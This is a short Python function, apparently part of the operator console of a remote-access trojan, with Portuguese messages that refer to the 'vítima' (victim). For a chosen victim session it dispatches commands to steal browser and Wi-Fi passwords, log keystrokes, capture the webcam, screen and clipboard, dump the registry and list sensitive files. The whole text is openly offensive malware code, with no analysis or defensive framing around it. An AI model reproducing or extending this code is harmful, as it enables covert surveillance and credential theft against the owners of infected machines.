def extract_data(server, session_id, data_type):
    """Extrai dados específicos da vítima"""
    if session_id not in server.sessions:
        server.console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
        return False
        
    commands = {
        'browser_passwords': 'extract_browser_passwords',
        'system_info': 'get_system_info',
        'network_info': 'get_network_info',
        'files': 'list_sensitive_files',
        'screenshot': 'screenshot_capture',
        'webcam': 'webcam_capture',
        'processes': 'list_processes',
        'services': 'list_services',
        'installed_software': 'list_installed_software',
        'network_connections': 'list_network_connections',
        'wifi_passwords': 'get_wifi_passwords',
        'clipboard': 'get_clipboard_content',
        'browser_history': 'get_browser_history',
        'keystrokes': 'capture_keystrokes',
        'registry': 'dump_registry',
        'event_logs': 'get_event_logs',
        'installed_drivers': 'list_installed_drivers',
        'environment_variables': 'get_environment_variables'
    }
    
    if data_type not in commands:
        server.console.print(f"[red]Tipo de dados inválido: {data_type}[/red]")
        server.console.print(f"[yellow]Tipos disponíveis: {', '.join(commands.keys())}[/yellow]")
        return False
    
    server.console.print(f"[yellow]Extraindo {data_type} da sessão {session_id}...[/yellow]")
    return server.send_command(session_id, commands[data_type])
